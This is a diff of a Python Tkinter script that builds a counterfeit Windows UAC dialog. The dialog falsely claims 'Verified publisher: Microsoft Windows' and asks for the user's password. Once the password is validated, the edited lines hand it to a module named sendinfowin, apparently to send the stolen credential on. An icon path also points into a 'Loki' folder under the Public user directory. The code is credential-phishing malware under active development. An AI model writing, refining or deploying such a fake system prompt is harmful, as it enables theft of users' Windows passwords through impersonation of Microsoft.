@@ -136,8 +136,8 @@ def on_button1_click(button_text):
     valid = is_valid_password (user, pword)
     if valid:
         other_script_path = r'sendinfowin.py'
-        subprocess.call ([sys.executable, other_script_path, pword])
-        #import sendinfowin
+        #subprocess.call ([sys.executable, other_script_path, pword])
+        import sendinfowin
         root.destroy ()
         root.master.quit ()
     else:
@@ -234,7 +234,7 @@ def create_uac_box(width_percent, height_percent1, height_percent2):
     label_btext1 = "Windows Settings"
     label_bottom1 = Label(bottom_frame, text=label_btext1, font=('Quebec Serial', 18), foreground="black", bg='#e6e6e6')
     label_bottom1.place(relx=0.18, rely=ys[1], anchor="w")
-    make_label(bottom_frame, "settings.png", 100, 95, 0.04, ys[1])
+    make_label(bottom_frame, r"C:\Users\Public\Loki\settings.png", 100, 95, 0.04, ys[1])
     label_btext2 = "Verified publisher: Microsoft Windows"
     label_bottom2 = Label(bottom_frame, text=label_btext2, font=('Quebec Serial', 14), foreground="black", bg='#e6e6e6')
     label_bottom2.place(relx=0.04, rely=ys[2], anchor="w")
